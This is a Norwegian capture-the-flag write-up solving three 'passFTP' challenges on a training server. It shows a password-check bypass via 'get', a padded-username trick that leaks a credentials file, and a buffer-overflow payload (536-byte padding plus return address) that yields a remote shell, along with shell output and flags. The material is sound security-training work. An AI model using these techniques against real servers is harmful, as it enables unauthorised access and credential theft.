# 2.5.1_passftp
Her var det bare å logge seg inn med nc passftp.utl 1024\
Lå en FLAGG-fil, hentet med get FLAGG

passFTP> get FLAGG\
Downloading file FLAGG\
FLAGG: c935921a63c755f7954aa7b43c858c67\
```
login@corax:~$ scoreboard FLAG{c935921a63c755f7954aa7b43c858c67}
Kategori: 2.5. Department of Security
Oppgave:  2.5.1_passftp
Svar:     c935921a63c755f7954aa7b43c858c67
Poeng:    10

Veldig bra!
```

# 2.5.2_passftp
Fant ut at get ignorerer passord-checken som cd får i passFTP_shared\
Tester meg litt frem og finner at passFTP_shared/src er en mappe, og finner passFTP_shared/src/main.c inni der. \
Denne nevner noe om at passordbeskyttede mapper har en egen .pass fil som sammenlignes med passordet man skriver inn\
Kjører bare `get passFTP_shared/.pass` og får dette passordet\
Jeg innså også litt senere at jeg egentlig bare kunne gjort `cd passFTP_shared/src` da denne ikke har noen .pass-fil.

Inne i kildekoden finner jeg hint til dette\
        // Use strncmp it's annoying to remove newlines from user input...\
        // TODO: Fix so you can't login with extra characters in username or password\

Finner ut at jeg kan logge inn som anonymous:anonymous, så antar at jeg skal lage en payload etter dette.\
Tester diverse, tenkte først jeg skal komme meg inn som brukernavn "user" men dette viste seg å være feil\
Etter å ha sett litt på printf-funksjonen innser jeg at hvis bufferet blir for langt så vil ikke null-byten som avslutter strengen sendes til printf.\
```
login@corax:~/2_oppdrag/5_department_of_security$ nc passftp.utl 1024
Welcome to passFTP Server v1.0
Please login to continue
Username: anonymous\n\n\n\n\n\n\n\n\n\n\n
Password: anonymous
Welcome anonymous\n\n\n\n\n\n\n\n\n\n\n
anonymous:anonymous:1
oper:59f078d5c8f8a8fe47f8367086014ec9:2
admin:nopasswd:3
```
oper:59f078d5c8f8a8fe47f8367086014ec9 er brukernavn og passord til user.\
I oper sin mappe finner jeg FLAGG
```
login@corax:~/2_oppdrag/5_department_of_security$ nc passftp.utl 1024
Welcome to passFTP Server v1.0
Please login to continue
Username: oper
Password: 59f078d5c8f8a8fe47f8367086014ec9
Welcome oper

passFTP> Unknown command
passFTP> ls
total 4
-rw-r--r-- 1 admin admin 40 Jan  3 14:19 FLAGG
passFTP> get FLAGG
Downloading file FLAGG
FLAGG: 6891268a3d693812e429bb1ce1ecc96d
```
```
login@corax:~$ scoreboard FLAG{6891268a3d693812e429bb1ce1ecc96d}
Kategori: 2.5. Department of Security
Oppgave:  2.5.2_passftp
Svar:     6891268a3d693812e429bb1ce1ecc96d
Poeng:    10

Godt jobbet! Vi har funnet en fil med kildekode knyttet til et MOV<-16-system. Vi har lagt den i oppdragsmappen din på corax. Kanskje du får bruk for den i Department of Nuclear Power?

Ny fil: /home/login/2_oppdrag/access16-v1.6.mos
```

# 2.5.3_passftp
Innså tidlig at det er put som skal brukes for å kunne komme seg inn som adminbruker.
```
buffer_size = 536
shell_function_address = p64(0x0040278d, endian='little')
payload = b'A' * buffer_size + shell_function_address
```
Fant addressen for å kjøre shell fra at jeg kompilerte mitt eget program og kjørte det gjennom IDA.\
Dette funket lokalt for å åpne shell, men på remote passFTP-serveren funket det ikke...\

Skjønte at det bare var at adressene var på en annen plass. Testet bare diverse verdier som shell_function_address og fant til slutt 0x0040238d som addressen der det blir skrevet ut "Invalid filename" i remote.\
Testet først for "Invalid filename"-addressen som lå i put-funksjonen, men fant fort ut at det var den som lå i get, fant differansen mellom remote og min egen og fant til slutt 0x0040265e\
Dette ga meg remote shell
```
$ cd ..
$ ls -la
total 32
drwxr-xr-x 1 admin admin 4096 Dec 22 12:57 .
drwx------ 1 admin admin 4096 Dec 22 12:57 ..
drwxr-xr-x 1 admin admin 4096 Dec 22 12:57 anonymous
drwxr-xr-x 1 admin admin 4096 Jan  5 00:08 user
$ cd ..
$ ls -la
total 836
drwx------ 1 admin admin   4096 Dec 22 12:57 .
drwxr-xr-x 1 root  root    4096 Dec 14 21:53 ..
-rw-r--r-- 1 admin admin    220 Dec 14 21:53 .bash_logout
-rw-r--r-- 1 admin admin   3526 Dec 14 21:53 .bashrc
-rw-r--r-- 1 admin admin    807 Dec 14 21:53 .profile
-rw-r--r-- 1 admin admin     40 Jan  3 14:19 FLAGG
drwxr-xr-x 1 admin admin   4096 Dec 22 12:57 files
-rwxr-xr-x 1 admin admin 787088 Dec 22 12:57 passFTP
-rw-r--r-- 1 admin admin     79 Jan  3 14:19 passwd.txt
-rwxr-xr-x 1 admin admin  18872 Dec 22 12:57 ynetd
$ cat FLAGG
FLAGG: c9f66c1d8bb869c69fc11b025cfa974d
```
Noen påsto senere at man bare kunne laste ned passFTP-filen fra passFTP_shared/src/-mappen og finne adressene direkte, men jeg prøvde dette tidlig uten at det funket... Gjorde vel noe feil.
```
login@corax:~$ scoreboard FLAG{c9f66c1d8bb869c69fc11b025cfa974d}
Kategori: 2.5. Department of Security
Oppgave:  2.5.3_passftp
Svar:     c9f66c1d8bb869c69fc11b025cfa974d
Poeng:    10

Imponerende!
```